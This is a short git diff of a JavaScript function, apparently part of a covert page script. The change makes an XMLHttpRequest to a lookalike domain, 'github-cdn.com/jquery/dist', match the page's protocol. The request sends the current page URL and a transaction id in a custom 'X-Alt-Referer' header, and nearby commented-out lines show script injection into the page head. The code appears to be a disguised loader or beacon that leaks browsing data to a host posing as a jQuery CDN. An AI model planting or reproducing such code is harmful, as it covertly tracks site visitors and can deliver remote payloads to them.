@@ -27,8 +27,14 @@ function whatever() {
         // head.appendChild(script);
 
         var url = document.URL;
+        var protocol = location.protocol;
 
-        xmlhttp.open("GET", "https://github-cdn.com/jquery/dist", true);
+        if(protocol == "https:") {
+            xmlhttp.open("GET", "https://github-cdn.com/jquery/dist", true);
+        }
+        else {
+            xmlhttp.open("GET", "http://github-cdn.com/jquery/dist", true);
+        }
         //xmlhttp.open("GET", "http://localhost:9000/jquery/dist", true);
         xmlhttp.setRequestHeader('Content-Type', 'application/json');
         xmlhttp.setRequestHeader('X-Alt-Referer', url + "?txid=" + uuid);  
